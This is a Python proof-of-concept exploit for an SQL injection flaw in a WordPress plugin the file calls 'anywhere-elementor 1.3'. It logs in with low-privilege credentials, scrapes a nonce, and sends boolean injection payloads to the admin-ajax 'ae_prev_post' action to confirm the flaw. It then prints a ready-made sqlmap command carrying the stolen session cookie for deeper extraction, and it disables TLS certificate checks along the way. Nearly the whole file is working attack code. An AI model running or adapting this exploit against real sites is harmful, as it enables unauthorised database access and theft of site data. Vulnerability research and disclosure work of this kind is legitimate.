#!/usr/bin/env python3
"""SQLi PoC (Subscriber+). Output: 1 sqlmap command. No file."""

import argparse, http.cookiejar, json, re, sys, urllib.parse, urllib.request, ssl


def build_opener():
    jar = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op, jar


def http_get(op, url, t=20):
    req = urllib.request.Request(url, method="GET")
    with op.open(req, timeout=t) as r:
        return r.read().decode("utf-8", "ignore")


def http_post(op, url, d, t=20):
    data = urllib.parse.urlencode(d).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with op.open(req, timeout=t) as r:
        return r.read().decode("utf-8", "ignore")


def detect(op, page_url, t=20):
    html = http_get(op, page_url, t)
    m = re.search(r'(https?://[^\s"\'<>]+/wp-admin/admin-ajax\.php)', html)
    if m:
        ajax = m.group(1).replace("\\/", "/")
        return ajax[:ajax.rfind("/wp-admin/admin-ajax.php")], ajax
    p = urllib.parse.urlparse(page_url)
    root = f"{p.scheme}://{p.netloc}"
    segs = [s for s in p.path.split("/") if s]
    if segs:
        return root + "/" + segs[0], root + "/" + segs[0] + "/wp-admin/admin-ajax.php"
    return root, root + "/wp-admin/admin-ajax.php"


def main():
    ap = argparse.ArgumentParser(description="SQLi PoC anywhere-elementor 1.3")
    ap.add_argument("--url", required=True, help="Any frontend post/page URL")
    ap.add_argument("--user", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--timeout", type=int, default=20)
    a = ap.parse_args()
    try:
        ssl._create_default_https_context = ssl._create_unverified_context
    except Exception:
        pass

    page_url = a.url.strip().strip('"').strip("'")
    op, jar = build_opener()
    base, ajax = detect(op, page_url, a.timeout)
    http_post(op, base + "/wp-login.php", {"log": a.user, "pwd": a.password,
        "wp-submit": "Log In", "redirect_to": base + "/wp-admin/", "testcookie": "1"}, a.timeout)
    admin_html = http_get(op, base + "/wp-admin/", a.timeout)
    if "Dashboard" not in admin_html and "wp-admin-bar" not in admin_html:
        print("[-] Login failed."); sys.exit(1)

    html = http_get(op, page_url, a.timeout)
    m = re.search(r'aep_nonce["\']\s*:\s*["\']([a-zA-Z0-9]{10})["\']', html)
    if not m:
        print("[-] Nonce not found."); sys.exit(1)
    nonce = m.group(1)

    def n(q):
        try:
            b = http_post(op, ajax, {"action": "ae_prev_post", "nonce": nonce,
                "post_type": "any", "q": q}, a.timeout)
            return len(json.loads(b).get("data", []))
        except Exception:
            return None

    if not (n("zzz_no_such_title_827346") == 0 and (n("' OR 1=1-- -") or 0) > 0
            and (n("' OR ASCII(SUBSTRING((SELECT @@version),1,1))=49-- -") or 0) > 0
            and n("' OR ASCII(SUBSTRING((SELECT @@version),1,1))=50-- -") == 0):
        print("[-] Not vulnerable."); sys.exit(1)

    print("[+] VULNERABLE")
    cookie = "; ".join(f"{c.name}={c.value}" for c in jar)
    print(f'python3 .\\sqlmap.py -u "{ajax}" --method POST --data="action=ae_prev_post&nonce={nonce}&post_type=any&q=e*" --cookie="{cookie}" -p q --dbms=mysql --technique=T --level=5 --risk=3 --time-sec=2 --retries=3 --threads=1 --timeout=30 --drop-set-cookie --batch --flush-session')


if __name__ == "__main__":
    raise SystemExit(main())
